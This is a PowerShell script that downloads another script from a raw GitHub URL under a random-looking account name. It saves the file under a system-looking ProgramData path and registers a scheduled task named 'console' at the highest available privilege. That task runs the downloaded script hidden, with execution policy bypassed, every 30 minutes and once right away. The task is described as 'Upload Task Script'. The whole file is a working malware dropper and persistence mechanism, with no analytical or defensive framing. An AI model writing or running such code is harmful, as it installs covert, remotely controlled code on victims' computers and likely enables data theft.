$taskName = "console"
$tempScript = "C:\ProgramData\Microsoft\Windows\console.ps1"
$xmlPath = "$env:TEMP\$taskName.xml"

# Ensure target directory exists
if (-not (Test-Path "C:\ProgramData\Microsoft\Windows")) {
    New-Item -Path "C:\ProgramData\Microsoft\Windows" -ItemType Directory -Force | Out-Null
}

# Cleanup old files
Remove-Item $tempScript, $xmlPath -Force -ErrorAction SilentlyContinue

# Download console.ps1 (UTF-8 without BOM)
try {
    $wc = New-Object System.Net.WebClient
    $bytes = $wc.DownloadData("https://raw.githubusercontent.com/ertgyhujkfghj/2/main/console.ps1")
    $content = [System.Text.Encoding]::UTF8.GetString($bytes)
    [System.IO.File]::WriteAllText($tempScript, $content, [System.Text.Encoding]::UTF8)
} catch {
    exit 1  # Exit if download fails
}

# Register scheduled task (every 30 minutes)
$xmlContent = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Upload Task Script</Description>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2005-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <Repetition>
        <Interval>PT30M</Interval>
        <Duration>PT24H</Duration>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT10M</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-WindowStyle Hidden -ExecutionPolicy Bypass -File "$tempScript"</Arguments>
    </Exec>
  </Actions>
</Task>
"@

# Save task XML
$xmlContent | Out-File -Encoding Unicode -FilePath $xmlPath

# Register the task
schtasks /Create /TN $taskName /XML $xmlPath /F | Out-Null

# Run once immediately
Start-Process -FilePath "powershell.exe" `
    -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`"" `
    -WindowStyle Hidden
